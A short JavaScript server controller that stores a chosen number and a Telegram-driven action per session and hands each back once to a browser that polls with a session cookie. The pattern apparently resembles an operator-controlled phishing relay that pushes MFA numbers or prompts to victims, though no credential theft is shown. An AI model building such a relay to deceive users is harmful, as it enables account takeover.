import { sendSecurityPreference } from "../telegramBot.js";
import { sessions } from "../sessionStore.js";

export function setSelectedNumber(req, res) {
  const { sessionId, number } = req.body;

  if (!sessionId) {
    return res.status(401).json({
      success: false,
      message: "No session ID provided.",
    });
  }

  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  session.selectedNumber = number;

  res.json({
    success: true,
    number: session.selectedNumber,
  });
}

export function setTelegramAction(req, res) {
  const { sessionId, action } = req.body;

  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  session.telegramAction = action;

  res.json({
    success: true,
  });
}

export function getSelectedNumber(req, res) {
  const sessionId = req.cookies.sessionId;

  if (!sessionId) {
    return res.status(401).json({
      success: false,
      message: "No session found.",
    });
  }

  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  const number = session.selectedNumber;

  session.selectedNumber = null;

  res.json({
    success: true,
    number,
  });
}

export function getTelegramAction(req, res) {
  const sessionId = req.cookies.sessionId;

  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  const action = session.telegramAction;

  session.telegramAction = null;

  res.json({
    success: true,
    action,
  });
}

export async function sendSecurityPreferenceMessage(req, res) {
  try {
    const sessionId = req.cookies.sessionId;

    if (!sessionId) {
      return res.status(401).json({
        success: false,
        message: "No session found.",
      });
    }

    const { variant } = req.body;

    await sendSecurityPreference(sessionId, variant);

    res.json({
      success: true,
    });
  } catch (error) {
    console.error("Failed to send Telegram message:", error);

    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
}
